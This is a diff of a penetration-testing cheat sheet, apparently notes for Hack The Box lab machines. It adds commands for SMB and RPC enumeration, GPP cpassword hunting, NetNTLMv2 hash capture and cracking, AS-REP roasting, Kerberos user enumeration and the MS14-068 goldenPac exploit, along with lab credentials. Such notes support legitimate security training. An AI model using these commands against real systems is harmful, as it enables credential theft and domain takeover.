@@ -15,20 +15,41 @@ netsh advfirewall firewall add rule name="SMB" protocol=TCP dir=out localport=44
 nmap -Pn -sT -n --script smb-enum-shares.nse  10.10.10.40 -p 135,139,445
 ```
 ```Shell
+smbclient -L 10.10.10.40 -U <users>%<pwd> 2>/dev/null 
 smbclient -L 10.10.10.40 -N 
 smbclient //10.10.10.40/Users -N
 smbclient -L 10.10.10.125 -N 2>/dev/null | grep "Disk" | awk '{print $1}' | while read shared; do echo "${shared} - "; smbclient -N //10.10.10.125/${shared} -c 'dir'; echo; done 
-```
+```--
 ```Shell
 smbmap -H 10.10.10.40 -u ''
 ```
 ```Shell
 mkdir smbFolder
-mount -t cifs //10.10.10.40/Users /tmp/smbFolder -o username=null,password=null,domain=WORKGROUP,rw
+mount -t cifs //10.10.10.40/SYSVOL /tmp/smbFolder -o username=null,password=null,domain=WORKGROUP,rw
+tree # view files
 ```
 ```Shell
 smbcacls //10.10.10.40/Users Admin/Desktop -N
 smbcacls //10.10.10.40/Users Admin/Desktop -N | grep Everyone
+```
+
+
+#### rpcclient
+```Shell
+rpcclient -U "" 10.10.10.52 #null session
+enumdomusers
+
+rpcclient -U "James%J@m3s_P@ssW0rd\!" 10.10.10.52 -c "enumdomusers"
+#"enumdomusers"
+rpcclient -U "James%J@m3s_P@ssW0rd\!" 10.10.10.52 -c "enumdomusers" | grep -oP '\[.*?\]' | grep '0x' | tr -d '[]' | while read rid; do rpcclient -U "James%J@m3s_P@ssW0rd\!" 10.10.10.52 -c "queryuser $rid" | grep -i "User Name"; done
+
+rpcclient -U "James%J@m3s_P@ssW0rd\!" 10.10.10.52 -c "enumdomgroups"  # grupos
+rpcclient -U "James%J@m3s_P@ssW0rd\!" 10.10.10.52 -c "querygroupmem 0x200"  #miembros del grupo x
+rpcclient -U "James%J@m3s_P@ssW0rd\!" 10.10.10.52 -c "queryuser 0x200"  # usuario
+```
+
+```Shell
+echo "hexhexhehx" | xxd -ps -r 
 ```
 
 #### Transer file
@@ -63,7 +84,6 @@ copy file.txt \\10.10.14.2\folder\file.txt
 ```Shell
 nmap -Pn -sT -n --script "vuln and safe" 10.10.10.40 -p 135,139,445
 ```
-
 ```Shell
 searchsploit eternalblue
 searchsploit -x 42315
@@ -71,7 +91,9 @@ searchsploit -m 42315
 ```
 
 ## Explotation
-
+```Shell
+grep -r "cpassword" . 2>/dev/null
+```
 
 #### Responder
 ```Shell
@@ -104,6 +126,40 @@ responder -I tun0
 #mssql-svc::QUERIER:5890d2ad2897e641:347A0136C3E30308B159CC3CA9B94AB0:01010000000000008070AE33E608D8015E3FB7F6F0A5952C00000000020008004600540048004D0001001E00570049004E002D00570059004E004100370043004400340034004800520004003400570049004E002D00570059004E00410037004300440034003400480052002E004600540048004D002E004C004F00430041004C00030014004600540048004D002E004C004F00430041004C00050014004600540048004D002E004C004F00430041004C00070008008070AE33E608D8010600040002000000080030003000000000000000000000000030000053744682CCB052C3C439A4E4224A65E6F6EA26598195450C9A37C27CAB683EA90A0010000000000000000000000000000000000009001E0063006900660073002F00310030002E00310030002E00310034002E003700000000000000000000000000
 john --wordlist=rockyou.txt hash.txt
 hashcat -m 5600 mssql-svc.netntlmv2 rockyou.txt -o cracked.txt --force
+```
+
+```Shell
+#Enumerate tables
+>SELECT TABLE_NAME FROM <database>.INFORMATION_SCHEMA.TABLES WHERE TABLE_TYPE = 'BASE TABLE';
+>go
+>go -m cvs > output.cvs
+>go -m html > output.html
+>USE <database>:
+>go
+```
+
+#### AD
+*** importante sincronisar tiempo con DC "rdate -n 10.10.10.52"
+```Shell
+crackmapexec smb 10.10.10.52 -u 'James' -p 'J@m3s_P@ssW0rd!'  --shares
+```
+```Shell
+ldapdomaindump -u "htb\James" -p "J@m3s_P@ssW0rd\!" 10.10.10.52 
+```
+```Shell
+nmap -p 88 --script krb5-enum-users --script-args krb5-enum-users.realm='htb.local',userdb=/opt/SecLists/Usernames/Names/names.txt 10.10.10.52
+kerbrute userenum --domain htb.local /opt/SecLists/Usernames/xato-net-10-million-usernames.txt --dc 10.10.10.52 
+```
+```Shell
+impacket-GetNPUsers 'htb.local/james:J@m3s_P@ssW0rd!' -dc-ip 10.10.10.52 # Dump the full list of ASP-REP vulnerable users
+```
+
+#MS14-068 - vuln kerberos
+https://wizard32.net/blog/knock-and-pass-kerberos-exploitation.html
+
+https://raw.githubusercontent.com/mubix/pykek/master/ms14-068.py
+```Shell
+impacket-goldenPac 'htb.local/james:J@m3s_P@ssW0rd!@mantis.htb.local'
 ```
 
 #### Shells
